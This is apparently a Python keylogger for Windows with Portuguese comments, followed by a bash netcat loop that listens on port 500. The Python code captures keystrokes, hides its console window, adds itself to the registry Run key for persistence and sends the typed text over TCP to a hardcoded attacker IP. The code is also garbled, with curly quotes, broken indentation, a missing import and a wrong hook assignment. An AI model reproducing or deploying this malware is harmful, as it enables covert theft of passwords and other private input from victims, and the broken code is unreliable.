#!/usr/bin/python

#P.S: para executar use Pyinstaller –onefile <script>.py na CLI.

##pega keystrokes                                        

import  pyHook, pythoncom 

##socket (cria canal de comunicação)                      

import socket

##tedirar chaves de resgistro e ocultar 

import win32event, win32api, winerror,win32console,win32gui

from _winreg import *

def AddProgramToStartup():             

#definindo diretório

fp=os.path.dirname(os.path.realpath(__file__))

#nome do arquivo

 file_name=”maleware.py”

new_file_path=fp+”\\”+file_name
 

#executando

keyVal= r’Software\Microsoft\Windows\CurrentVersion\Run’

key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)

SetValueEx(key2change, “HacKeD”,0,REG_SZ, new_file_path)

##variável com IP do atacante

data=”

HOST_IP=”192.168.4.78″

def SendToRemoteServer():               

 global data                                           

#TCP socket com porta de ataque

 sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 sock.connect((HOST_IP, 500))

 sock.send(data)

 sock.close()

  return True

def HideCmd():      

 window = win32console.GetConsoleWindow()    

 win32gui.ShowWindow(window,0)                          

return True


def GetKeyPressedAndSendIt(event):                       

global data                                                   

#ASCII

if event.Ascii==13:           
 keys='<ENTER>’

elif event.Ascii==8:
 keys='<BACK SPACE>’

elif event.Ascii==9:
 keys='<TAB>’

else:

 keys=chr(event.Ascii)           

 
 data=data+keys    #buffer de dados

 HideCmd()                                                                     

 SendToRemoteServer()                                              

AddProgramToStartup()

#####

hm = pyHook.HookManager()
hm.KeyDown = GetKeyPressedAndSendIt()         
hm.HookKeyboard()
pythoncom.PumpMessages()

########


#!/usr/bin/bash

while true

do

nc -nlp 500                 #abre a porta 500 permanentement

done
